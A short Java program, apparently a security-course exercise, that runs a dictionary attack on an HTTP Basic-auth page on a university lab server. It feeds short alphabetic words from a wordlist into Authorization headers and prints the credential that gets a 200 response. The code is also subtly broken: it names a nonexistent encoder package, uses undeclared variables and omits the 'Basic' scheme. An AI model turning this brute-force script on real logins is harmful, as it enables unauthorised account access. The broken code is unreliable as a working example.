import java.net.*;
import java.util.*;
import java.io.*;



public class Dictionary {
  URL url;
  URLConnection uc;
  String username, password, encoding;
  int pretime, posttime;
  String c;

  public Dictionary(){
    pretime = new Date().getTime();
    try{
      url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/index.php");
    }catch(MalformedURLException e){
      e.printStackTrace();
    }
    username = "";
  }

  public void checkPassword(String pw){
    try{
      password = new String(pw);
      encoding = new pw.misc.BASE64Encoder().encode((username+":"+password).getBytes());
      uc = url.openConnection();
      uc.setRequestProperty("Authorization", " " + encoding);
       bf = uc.getHeaderField(null);
      System.out.println(password);
      if(bf.equals("HTTP/1.1 200 OK")){
        posttime = new Date().getTime();
         diff = posttime - pretime;
        System.out.println(username+":"+password);
        System.out.println();
        System.out.println(diff/1000/60 + " minutes " + diff/1000%60 + " seconds");
        System.exit(0);
      }
    }catch(MalformedURLException e){
      e.printStackTrace();
    }catch(IOException ioe){
      ioe.printStackTrace();
    }
  }

  public static void main (String[] args){
    Dictionary dict = new Dictionary();
    String pw;
    int number = 0;
    try{
      FileReader fr = new FileReader("words");
      BufferedReader bf = new BufferedReader(fr);
      while ((pw = bf.readLine()) != null) {
        
        if ((pw.length() <=3 ) && (pw.matches("[a-zA-Z]*"))){
          dict.checkPassword(pw);
	}
      }
    }catch(IOException e){
      e.printStackTrace();
    }
  }
}
